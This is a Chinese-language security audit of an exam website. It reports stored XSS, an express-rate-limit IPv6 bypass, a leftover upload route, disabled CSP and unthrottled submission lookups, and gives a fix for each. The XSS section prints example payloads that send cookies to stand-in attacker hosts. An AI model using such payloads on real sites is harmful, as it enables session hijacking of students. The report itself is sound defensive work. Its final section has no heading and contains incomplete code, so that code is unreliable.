### N-H1｜Stored XSS — 題目內容未轉義（高風險）

| 項目 | 內容 |
|------|------|
| **OWASP 分類** | A03:2021 – Injection (CWE-79) |
| **CVSS 評分** | 8.1（高） |
| **受影響範圍** | `exam.html`、`result.html`、`analysis.html`、`exam-list.html`、`admin.html`、`results.html` |
| **修復狀態** | ✅ 已修復 |

**問題描述**

前端頁面使用 `element.innerHTML = \`...\${q.content}...\`` 方式直接將使用者資料插入 DOM，未經 HTML 跳脫處理。攻擊者（具管理員權限者）可在題目內容、解析、選項、學生姓名等欄位注入惡意腳本：

```javascript
// ❌ 修復前：q.content 直接注入 HTML
container.innerHTML = examData.questions.map((q, i) => `
  <p class="text-gray-800 mb-4 leading-relaxed">${q.content}</p>
`).join('');

// 攻擊者在題目內容填入：
// <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
// → 學生開啟考試頁面時，腳本在其瀏覽器執行
```

**受影響的頁面與欄位**

| 頁面 | 受影響欄位 |
|------|-----------|
| `exam.html` | `q.content`（題目內容） |
| `result.html` | `data.student_name`、`d.content`、`d.given_answer`、`d.correct_answer`、`d.explanation`、選項文字 |
| `analysis.html` | `d.student_name`、`d.exam_title`、`q.content`、`q.given_answer`、`q.correct_answer`、`q.explanation` |
| `exam-list.html` | `e.title`、`e.description` |
| `admin.html` | `q.content`（題庫表格、選題區、ML 分析）、`data.error`（錯誤訊息） |
| `results.html` | `s.student_name`、`s.student_id` |

**攻擊情境**

```
1. 具管理員帳號的惡意使用者在題目內容輸入：
   <script>document.location='https://evil.com/steal?d='+document.cookie</script>
2. 學生開啟包含該題的考試 → 腳本執行
3. 或在試卷標題注入 XSS → 攻擊所有瀏覽 exam-list.html 的學生
```

**修復方式**

在每個前端頁面加入 `escHtml()` 函式，並對所有 `innerHTML` 中的使用者資料呼叫：

```javascript
// ✅ 修復後：所有頁面均加入此函式
function escHtml(s) {
  if (s == null) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// 應用於所有 innerHTML 插值
container.innerHTML = examData.questions.map((q, i) => `
  <p class="text-gray-800 mb-4 leading-relaxed">${escHtml(q.content)}</p>
`).join('');
```

> ✅ 已在 `generate-public.js` 中完成修復，並重新產生所有 8 個前端頁面。  
> MathJax 數學公式渲染（`$...$`）不受影響，因 `$` 符號不需 HTML 跳脫。

### N-H2｜CVE — express-rate-limit IPv6 繞過漏洞（高風險）

| 項目 | 內容 |
|------|------|
| **OWASP 分類** | A06:2021 – Vulnerable and Outdated Components |
| **CVE / Advisory** | [GHSA-46wh-pxpv-q5gq](https://github.com/advisories/GHSA-46wh-pxpv-q5gq) |
| **CVSS 評分** | 7.5（高） |
| **受影響版本** | `express-rate-limit` 8.2.0 – 8.2.1 |
| **修復狀態** | ✅ 已修復（升級至 8.2.2+） |

**問題描述**

`npm audit` 發現依賴套件 `express-rate-limit` 存在已知安全漏洞：使用雙棧（Dual-stack）網路設定的伺服器上，IPv4-mapped IPv6 位址（如 `::ffff:1.2.3.4`）會被視為不同的 IP，導致攻擊者可用 IPv4 和 IPv6 形式各自獲得完整速率限制額度，實際速率限制減半，可繞過 `POST /api/exams/:id/submit` 的防暴力措施。

```bash
# 修復前 npm audit 輸出
express-rate-limit  8.2.0 - 8.2.1
Severity: high
express-rate-limit: IPv4-mapped IPv6 addresses bypass per-client rate limiting
```

**修復方式**

```bash
npm update express-rate-limit
# → 升級至 express-rate-limit@8.2.2（已修復）
```

### N-M1｜遺留音檔上傳 API（中風險）⚠️ 待處理

| 項目 | 內容 |
|------|------|
| **OWASP 分類** | A05:2021 – Security Misconfiguration |
| **CVSS 評分** | 4.5（中） |
| **受影響端點** | `POST /api/audio/upload` |
| **修復狀態** | ⚠️ 待處理 |

**問題描述**

系統前端管理介面已於 v1.7.0 移除音檔上傳 UI，改採 TTS 語音朗讀，但後端 `server.js` 中的 `/api/audio/upload` 路由仍然存在：

```javascript
// server.js Lines 65-73（仍存在）
app.post('/api/audio/upload', requireAdmin, (req, res, next) => {
  upload.single('audio')(req, res, (err) => {
    if (err) return res.status(400).json({ error: err.message });
    if (!req.file) return res.status(400).json({ error: '未收到音訊檔案' });
    const audioUrl = `/audio/${req.file.filename}`;
    res.json({ audio_url: audioUrl, filename: req.file.filename });
  });
});
```

此外，檔名使用 `Date.now()` 生成（可預測），未使用密碼學安全的隨機名稱：

```javascript
filename: (req, file, cb) => {
  const ext = path.extname(file.originalname).toLowerCase() || '.mp3';
  cb(null, `audio_${Date.now()}${ext}`); // ← 可預測、同毫秒碰撞
}
```

雖然端點已受 `requireAdmin` 保護，但遺留的文件上傳功能擴大了系統攻擊面，且若管理員金鑰外洩，攻擊者可上傳任意檔案至 `uploads/audio/` 目錄。

**建議修復方式**

```javascript
// 方案一：直接移除遺留路由（推薦，已不需要）
// 刪除 server.js 第 1-36 行的 multer 設定及第 65-73 行的上傳路由

// 方案二：若需保留，改用加密隨機檔名
const { randomBytes } = require('crypto');
filename: (req, file, cb) => {
  const ext = ['.mp3','.wav','.ogg','.m4a'].includes(
    path.extname(file.originalname).toLowerCase()
  ) ? path.extname(file.originalname).toLowerCase() : '.mp3';
  cb(null, `audio_${randomBytes(16).toString('hex')}${ext}`);
}
```

### N-M2｜Content Security Policy 停用（中風險）⚠️ 待處理

| 項目 | 內容 |
|------|------|
| **OWASP 分類** | A05:2021 – Security Misconfiguration |
| **CVSS 評分** | 4.3（中） |
| **受影響範圍** | 所有前端頁面 |
| **修復狀態** | ⚠️ 待處理 |

**問題描述**

`server.js` 使用 `helmet` 提供安全標頭，但明確停用 CSP：

```javascript
// server.js Line 39
app.use(helmet({ contentSecurityPolicy: false })); // ← CSP 未啟用
```

雖然本次審查已修復 Stored XSS（N-H1），但停用 CSP 使瀏覽器缺乏額外防線，一旦發現新的 XSS 漏洞（如第三方套件注入），攻擊者可執行任意腳本、載入外部資源。

**建議修復方式**

由於前端使用 Tailwind CDN 及 MathJax CDN，需要寬鬆的 `script-src` 規則：

```javascript
// ✅ 建議：啟用 CSP 並設定允許清單
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        'https://cdn.tailwindcss.com',
        'https://cdn.jsdelivr.net',   // MathJax
      ],
      styleSrc: ["'self'", "'unsafe-inline'", 'https://cdn.tailwindcss.com'],
      imgSrc: ["'self'", 'data:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'", 'https://fonts.googleapis.com', 'https://fonts.gstatic.com'],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],
    }
  }
}));
```

### N-L1｜提交紀錄查詢無速率限制（低風險）⚠️ 待處理

| 項目 | 內容 |
|------|------|
| **OWASP 分類** | A07:2021 – Identification and Authentication Failures |
| **CVSS 評分** | 3.7（低） |
| **受影響端點** | `GET /api/submissions/:id` |
| **修復狀態** | ⚠️ 待處理（與 M-4 合併修復） |

**問題描述**

提交紀錄查詢端點沒有速率限制，配合 M-4（Submission ID 可枚舉）可讓攻擊者快速掃描所有學生作答紀錄：

```javascript
// server.js
app.get('/api/submissions/:id', (req, res) => {
  // 無速率限制，攻擊者可連續查詢 /api/submissions/1, 2, 3...
  const sub = db.prepare('SELECT * FROM submissions WHERE id = ?').get(req.params.id);
  ...
});
```

**建議修復方式**

```javascript
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,  // 15 分鐘內最多 100 次
  message: { error: '請求過於頻繁，請稍後再試' }
});
app.get('/api/submissions/:id', generalLimiter, (req, res) => { ... });
```

> 根本解決方案為修復 M-4（改用 UUID），使 ID 無法枚舉。

| **受影響端點** | `POST /api/generate-question` |
| **修復狀態** | ⚠️ 待處理 |

**問題描述**

AI 出題端點直接將例外訊息回傳給客戶端，可能洩漏 API 服務商名稱、URL 路徑、模型名稱等資訊：

```javascript
// server.js（LLM 生成路由）
} catch (err) {

```

**建議修復方式**

```javascript
} catch (err) {

    error: isKeyMissing ? 'LLM API Key 未設定' : 'AI 生成失敗，請稍後再試'
  });
}
```
